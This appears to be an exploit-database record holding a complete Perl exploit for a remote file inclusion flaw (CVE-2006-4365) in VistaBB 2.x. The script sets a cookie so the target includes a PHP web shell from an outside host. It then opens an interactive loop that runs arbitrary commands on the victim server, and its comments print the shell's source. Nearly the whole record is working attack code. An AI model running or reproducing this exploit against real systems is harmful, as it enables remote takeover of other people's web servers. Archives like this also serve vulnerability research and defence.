{
  "id": "2251",
  "title": "VistaBB 2.x - &#039;functions_mod_user.php&#039; Remote File Inclusion",
  "cve": "CVE-2006-4365",
  "vuln_type": "unknown",
  "code": "#!/usr/bin/perl\r\n# Method found and exploit scripted by nukedx\r\n# Contacts> ICQ: 10072 Web: http://www.nukedx.com MAIL/MSN: nukedx@nukedx.com\r\n# Original advisory can be found at: http://www.nukedx.com/?viewdoc=48\r\n# \r\n# VistaBB <= 2.x Remote Command Execution Exploit\r\n# \r\n# This exploit comes with it's own php shell setting. If you wanna change it your file must contain this data >\r\n#\r\n# <?php\r\n# echo \"_START_\\n\";\r\n# ini_set(\"max_execution_time\",0);\r\n# error_reporting(0);\r\n# passthru($_REQUEST[command]);\r\n# echo \"\\n_END_\";\r\n# ?>\r\n#\r\n# Copyright 2006 (C) nukedx\r\n#\r\n# Greetz to: WW,xT,php from my team NWPX , str0ke , cha0s , Preddy , Yns , |SaMaN|, Caesar , Ogre and all of my  friends\r\nuse IO::Socket;\r\n# Default configuration\r\n$shell = \"http://hometown.aol.com/yarivgiladi/sh.php\";\r\n# Checking user settings\r\nif(@ARGV != 2) { usage(); }\r\nelse { exploit(); }\r\nsub header()\r\n{\r\n  print \"\\n- NukedX Security Advisory Nr.2006-44\\r\\n\";\r\n  print \"- VistaBB <= 2.x Remote Command Execution Exploit\\r\\n\";\r\n}\r\nsub usage() \r\n{\r\n  header();\r\n  print \"- Usage: $0 <host> <path>\\r\\n\";\r\n  print \"- <host> -> Victim's host ex: www.victim.com\\r\\n\";\r\n  print \"- <path> -> Path to VistaBB ex: /vistabb/ or just /\\r\\n\";\r\n  exit();\r\n}\r\nsub exploit() {\r\n  # User variables\r\n  $host = $ARGV[0];\r\n  $host =~ s/(http:\\/\\/)//eg;\r\n  $target = $ARGV[1].\"includes/functions_mod_user.php\";\r\n  $good = 0;\r\n  $c2s = \"command=whoami\";\r\n  $c2slen = length($c2s);\r\n  print \"Trying to connect: $host\\r\\n\";\r\n  $sock = IO::Socket::INET->new( Proto => \"tcp\", PeerAddr => $host, PeerPort => 80) || die \"Connection  failed...\\r\\n\";\r\n  print \"Connected to victim: $host\\r\\n\";\r\n  print $sock \"POST $target HTTP/1.1\\n\";\r\n  print $sock \"Host: $host\\n\";\r\n  print $sock \"Accept: */*\\n\";\r\n  print $sock \"Referer: $host\\r\\n\";\r\n  print $sock \"Accept-Language: tr\\r\\n\";\r\n  print $sock \"Content-Type: application/x-www-form-urlencoded\\r\\n\";\r\n  print $sock \"Accept-Encoding: gzip, deflate\\r\\n\";\r\n  print $sock \"User-Agent: NukeZilla\\r\\n\";\r\n  print $sock \"Cookie: phpbb_root_path=\".$shell.\"?\\r\\n\";\r\n  print $sock \"Content-length: $c2slen\\r\\n\";\r\n  print $sock \"Connection: Keep-Alive\\r\\n\";\r\n  print $sock \"Cache-Control: no-cache\\r\\n\\r\\n\";\r\n  print $sock $c2s;\r\n  print $sock \"\\r\\n\\r\\n\";\r\n  while($result = <$sock>)\r\n  {\r\n    if($result =~ /^_END_/)\r\n    {\r\n      $good=0;\r\n      close($sock);\r\n    }\r\n    if($good==1)\r\n    {\r\n      if (!$whoami) {\r\n        $whoami = trim($result);\r\n        print \"Logged as $whoami\\r\\nType exit for exit dont press ctrl+c\\r\\n\";\r\n      }\r\n    }\r\n    if ($good==0) \r\n    {\r\n      if ($result =~ /Warning: include_once/) { print \"Sorry victim is not vulnerable...\\r\\nClosing exploit...\\r\\n\";sleep(3);exit(); }\r\n    }\r\n    if($result =~ /^_START_/)\r\n    {\r\n      $good=1;\r\n    }\r\n  }\r\n  while()\r\n  {\r\n    print \"[\".$whoami.\"@\".$host.\" /]\\$ \";\r\n    while(<STDIN>)\r\n    {\r\n      $cmds=$_;\r\n      chomp($cmds);\r\n      last;\r\n    }\r\n    if ($cmds =~ /^exit/) { print \"Closing exploit...\\r\\n\";sleep(3);exit(); }\r\n    else { sendcmd(); }\r\n  }\r\n}\r\nsub sendcmd () {\r\n  $c2s = \"command=\".$cmds;\r\n  $c2slen = length($c2s);\r\n  $sock = IO::Socket::INET->new( Proto => \"tcp\", PeerAddr => $host, PeerPort => 80) || die \"Connection lost...\\r\\n\";\r\n  print $sock \"POST $target HTTP/1.1\\n\";\r\n  print $sock \"Host: $host\\n\";\r\n  print $sock \"Accept: */*\\n\";\r\n  print $sock \"Referer: $host\\r\\n\";\r\n  print $sock \"Accept-Language: tr\\r\\n\";\r\n  print $sock \"Content-Type: application/x-www-form-urlencoded\\r\\n\";\r\n  print $sock \"Accept-Encoding: gzip, deflate\\r\\n\";\r\n  print $sock \"User-Agent: NukeZilla\\r\\n\";\r\n  print $sock \"Cookie: phpbb_root_path=\".$shell.\"?\\r\\n\";\r\n  print $sock \"Content-length: $c2slen\\r\\n\";\r\n  print $sock \"Connection: Keep-Alive\\r\\n\";\r\n  print $sock \"Cache-Control: no-cache\\r\\n\\r\\n\";\r\n  print $sock $c2s;\r\n  print $sock \"\\r\\n\\r\\n\";\r\n  while($result = <$sock>)\r\n  {\r\n    if($result =~ /^_END_/)\r\n    {\r\n      $good=0;\r\n      close($sock);\r\n    }\r\n    if($good==1)\r\n    {\r\n      print $result;\r\n    }\r\n    if ($good==0) \r\n    {\r\n      if ($result =~ /Warning: include_once/) { print \"Sorry victim is not vulnerable or patched!...\\r\\nClosing exploit...\\r\\n\";sleep(3);exit(); }\r\n    }\r\n    if($result =~ /^_START_/)\r\n    {\r\n      $good=1;\r\n    }\r\n  }\r\n}\r\nsub trim($)\r\n{\r\n  \tmy $string = shift;\r\n  \t$string =~ s/^\\s+//;\r\n  \t$string =~ s/\\s+$//;\r\n  \treturn $string;\r\n} \r\n\r\n# nukedx.com [2006-08-24]\r\n\r\n# milw0rm.com [2006-08-23]",
  "url": "https://www.exploit-db.com/exploits/2251"
}